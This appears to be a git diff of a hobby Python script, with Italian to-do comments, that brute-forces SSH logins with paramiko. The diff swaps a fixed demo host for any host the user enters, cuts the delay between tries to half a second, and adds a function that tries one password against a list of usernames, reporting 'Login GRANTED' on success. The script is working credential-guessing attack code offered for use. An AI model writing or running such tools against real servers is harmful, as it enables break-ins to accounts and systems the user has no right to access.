@@ -304,9 +304,9 @@ def ssh_1_connect():
     for password in password_list:
         try:
             ssh.connect(
-                hostname='test.rebex.net', port=22, username='demo', password='password', disabled_algorithms=None, look_for_keys=False, allow_agent=False
+                hostname=info['host'], port=info['port'], username=info['user'], password=password, disabled_algorithms=None, look_for_keys=False, allow_agent=False
                 )
-            time.sleep(1)
+            time.sleep(0.5)
         except paramiko.AuthenticationException:
             print(f'Login failed with user "{info['user']}" and password "{password}".')
             ssh.close()
@@ -324,12 +324,12 @@ def ssh_2_info():
         info['port'] = int(input(
             'Enter the port: '
         ))
-        info['password'] = input(
-                'Enter the password: '
-            )
         user_list_file = input(
                 "Please type the file's path containing the passwords' list: "
             )
+        info['password'] = input(
+            'Enter the password: '
+        )
         try:
             with open(user_list_file, 'r', encoding='utf-8') as file:
                 user_list = [line.strip() for line in file]
@@ -337,6 +337,25 @@ def ssh_2_info():
             print('This file does not exist, please try again.')
         else:
             return user_list
+
+def ssh_2_connect():
+    user_list = ssh_2_info()
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    for user in user_list:
+        try:
+            ssh.connect(
+                hostname=info['host'], port=info['port'], username=user, password=info['password'], disabled_algorithms=None, look_for_keys=False, allow_agent=False
+                )
+            time.sleep(0.5)
+        except paramiko.AuthenticationException:
+            print(f'Login failed with user "{user}" and password "{info['password']}".')
+            ssh.close()
+        else:
+            print(f'Login GRANTED with user "{user}" and password "{info['password']}".')
+            break
+
+
 
 
    
@@ -372,6 +391,7 @@ def input_mode():
             return None
         elif selected_mode == 'c':
             ssh()
+            return None
         else:
             print('Mode not found, please try again.')
 
@@ -380,3 +400,4 @@ input_mode()
 # BISOGNA METTERE UN IF Q DOVE CI SONO GLI INPUT IM MODO CHE SE VOLESSE USCIRE LO PUO FARE
 # BISOGNA PENSARE AL DELAY TRA UN TENTATIVO E UN ALTRO PER EVITARE DANNI
 # Mettere un opzione per lasciare la porta di default o user vuoto
+# Mettere dei colori per denied e granted
